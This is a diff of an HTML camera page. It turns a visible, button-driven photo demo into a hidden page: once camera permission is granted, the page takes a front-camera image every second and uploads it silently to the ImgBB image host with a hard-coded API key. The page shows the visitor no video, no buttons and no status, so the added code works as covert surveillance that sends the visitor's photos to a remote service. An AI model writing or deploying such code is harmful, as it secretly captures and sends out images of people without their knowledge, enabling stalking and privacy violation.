@@ -1,78 +1,71 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Front Camera Upload Demo</title>
-  <style>
-    body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; margin-top: 40px; }
-    video, canvas { border-radius: 10px; border: 1px solid #ccc; max-width: 90%; }
-    button { margin-top: 15px; padding: 10px 18px; font-size: 16px; cursor: pointer; border-radius: 6px; }
-  </style>
+  <title>Looped Capture and Upload</title>
 </head>
 <body>
-  <h2>📸 Front Camera Capture</h2>
-  <video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
-  <button id="captureBtn">Take Photo</button>
-  <button id="uploadBtn" style="display:none;">Upload to ImgBB</button>
-  <p id="status"></p>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const captureBtn = document.getElementById('captureBtn');
-    const uploadBtn = document.getElementById('uploadBtn');
-    const status = document.getElementById('status');
+    const video = document.createElement('video');
+    const canvas = document.createElement('canvas');
     let photoData = '';
 
-    // Ask for front camera permission
     async function initCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' }, // front camera
+          video: { facingMode: 'user' },
           audio: false
         });
         video.srcObject = stream;
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+          };
+        });
+
+        // Start looping capture every second
+        setInterval(captureAndUpload, 1000);
       } catch (err) {
-        status.textContent = 'Camera access denied or not available.';
+        console.error('Camera access denied or not available.', err);
       }
     }
 
-    captureBtn.onclick = () => {
+    async function captureAndUpload() {
       const context = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      photoData = canvas.toDataURL('image/png').split(',')[1]; // remove the "data:image/png;base64," part
-      uploadBtn.style.display = 'inline-block';
-      status.textContent = '✅ Photo captured! Click upload to send.';
-    };
-
-    uploadBtn.onclick = async () => {
-      status.textContent = 'Uploading...';
+      photoData = canvas.toDataURL('image/png').split(',')[1];
 
       try {
-        const res = await fetch('https://api.imgbb.com/1/upload', {
-          method: 'POST',
-          body: new URLSearchParams({
-            key: '36bf4af9003bd786c70577cbfb06ef73',
-            image: photoData
-          })
-        });
+const uniqueName = `photo_${Date.now()}`; // e.g., photo_1697220000000
+
+const res = await fetch('https://api.imgbb.com/1/upload', {
+  method: 'POST',
+  body: new URLSearchParams({
+    key: '36bf4af9003bd786c70577cbfb06ef73',
+    image: photoData,
+    name: uniqueName
+  })
+});
+
 
         const data = await res.json();
         if (data.success) {
-          status.innerHTML = `✅ Uploaded! <a href="${data.data.url}" target="_blank">View Image</a>`;
+          console.log('✅ Uploaded:', data.data.url);
         } else {
-          status.textContent = '❌ Upload failed.';
+          console.error('❌ Upload failed.');
         }
       } catch (e) {
-        status.textContent = '⚠️ Error uploading image.';
+        console.error('⚠️ Error uploading image.', e);
       }
-    };
+    }
 
-    initCamera();
+    window.onload = initCamera;
   </script>
 </body>
 </html>
